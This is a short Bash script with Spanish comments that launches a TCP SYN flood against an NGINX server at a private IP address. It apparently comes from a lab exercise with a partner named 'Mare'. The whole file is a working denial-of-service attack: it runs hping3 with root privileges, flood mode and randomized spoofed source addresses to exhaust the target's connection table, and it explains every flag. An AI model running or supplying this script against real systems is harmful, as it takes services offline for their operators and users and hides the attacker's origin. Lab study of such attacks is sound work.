#!/bin/bash

# ==============================================================================
# Script de Ataque: TCP SYN Flood (Capa 4)
# Objetivo: Agotar la tabla de conexiones (SYN_RECV) del servidor web NGINX.
# ==============================================================================

# IP del servidor NGINX (A coordinar con Mare)
TARGET_IP="192.168.100.10"
TARGET_PORT=80

echo "======================================================"
echo " INICIANDO ATAQUE TCP SYN FLOOD "
echo " Objetivo: $TARGET_IP:$TARGET_PORT"
echo " Presiona [Ctrl+C] para detener la ejecución."
echo "======================================================"

# Ejecución de hping3 con privilegios para forjar paquetes
# Explicación de las banderas:
# -S : Establece el flag TCP SYN (Inicia la conexión).
# -p : Puerto destino.
# --flood : Envía paquetes lo más rápido posible, sin esperar respuestas.
# --rand-source : Falsifica la IP de origen (Spoofing) para que el servidor 
#                 no pueda cerrar las conexiones rápidamente.

sudo hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP